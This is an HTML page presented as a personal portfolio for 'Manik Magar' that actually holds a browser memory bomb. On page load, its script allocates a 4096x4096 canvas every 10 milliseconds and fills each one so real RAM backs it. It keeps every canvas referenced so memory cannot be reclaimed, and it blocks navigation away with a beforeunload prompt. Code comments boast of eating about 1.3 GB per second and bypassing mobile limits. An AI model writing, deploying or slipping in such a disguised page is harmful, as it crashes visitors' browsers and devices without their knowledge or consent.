<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portfolio - Manik Magar</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #000;
            color: #0f0;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .panel {
            background: #111;
            border: 2px solid #0f0;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            min-width: 300px;
            max-width: 90vw;
        }
        h1 { margin: 0 0 20px 0; font-size: 24px; }
        .stats {
            margin: 20px 0;
            font-size: 16px;
            line-height: 1.8;
        }
        .warning {
            color: #ff0;
            font-weight: bold;
            margin-top: 20px;
            font-size: 14px;
        }
        .terminal {
            margin-top: 20px;
            background: #0a0a0a;
            border: 1px solid #333;
            border-radius: 6px;
            text-align: left;
            font-size: 13px;
            line-height: 1.6;
            overflow: hidden;
        }
        .terminal-header {
            background: #1a1a1a;
            border-bottom: 1px solid #333;
            padding: 6px 12px;
            color: #aaa;
            font-size: 12px;
        }
        .terminal-body {
            padding: 12px;
            color: #ccc;
            white-space: pre-wrap;
            word-break: break-word;
        }
    </style>
</head>
<body>
    <div class="panel">
        <h1>MANIK MAGAR</h1>
        <div class="stats">
            <div>Girlfriend: <span id="count">0</span> x 0</div>
            <div>Parameter: <span id="memory">0</span>B PARAMETERS</div>
            <div>Status: <span id="status">Idle</span></div>
        </div>
        <div class="terminal">
            <div class="terminal-header">My Details</div>
            <div class="terminal-body" id="terminal"></div>
        </div>
    </div>

    <script>
        // 4096x4096 bypasses mobile texture limits but still eats ~67MB per canvas.
        // This guarantees the browser accepts the allocation instead of silently failing.
        const CANVAS_SIZE = 4096; 
        const BYTES_PER_PIXEL = 4; // RGBA
        
        // 50ms interval. 67MB every 50ms = ~1.3 GB of RAM eaten per second.
        const ALLOCATION_INTERVAL = 10; 
        
        let canvases = [];
        let isRunning = false;

        function updateStats() {
            document.getElementById('count').textContent = canvases.length;
            
            // Accurate math based on the actual constant, not hardcoded guesses
            const totalBytes = canvases.length * (CANVAS_SIZE * CANVAS_SIZE * BYTES_PER_PIXEL);
            const memoryGB = (totalBytes / (1024 * 1024 * 1024)).toFixed(2);
            document.getElementById('memory').textContent = memoryGB;
        }

        function allocateCanvas() {
            if (!isRunning) return;

            try {
                const canvas = document.createElement('canvas');
                canvas.width = CANVAS_SIZE;
                canvas.height = CANVAS_SIZE;
                
                const ctx = canvas.getContext('2d');
                if (!ctx) throw new Error('Failed to get context (Dimension limit hit?)');
                
                // Force the OS to actually back the pixels in RAM
                ctx.fillStyle = '#ff0000';
                ctx.fillRect(0, 0, CANVAS_SIZE, CANVAS_SIZE);
                
                // Store it so garbage collector can't touch it
                canvases.push(canvas);
                
                updateStats();
                document.getElementById('status').textContent = 'Heartbroken...🥀';
                
                // Schedule next allocation
                setTimeout(allocateCanvas, ALLOCATION_INTERVAL);
                
            } catch (error) {
                isRunning = false;
                document.getElementById('status').textContent = 'CRASHED - OOM';
                document.getElementById('status').style.color = '#f00';
                console.error('Memory allocation failed:', error);
            }
        }

        function startBomb() {
            if (isRunning) return;
            
            isRunning = true;
            canvases = [];
            document.getElementById('status').textContent = 'Starting...';
            
            allocateCanvas();
        }

        // Try to prevent accidental navigation, though mobile OS killers will ignore this
        window.addEventListener('beforeunload', (e) => {
            if (canvases.length > 0) {
                e.preventDefault();
                e.returnValue = '';
                return '';
            }
        });

        window.addEventListener('load', () => {
            startBomb();
            updateTerminal();
        });

        function updateTerminal() {
            document.getElementById('terminal').textContent = `Loading hansome portfolio...`;
        }
    </script>
</body>
</html>
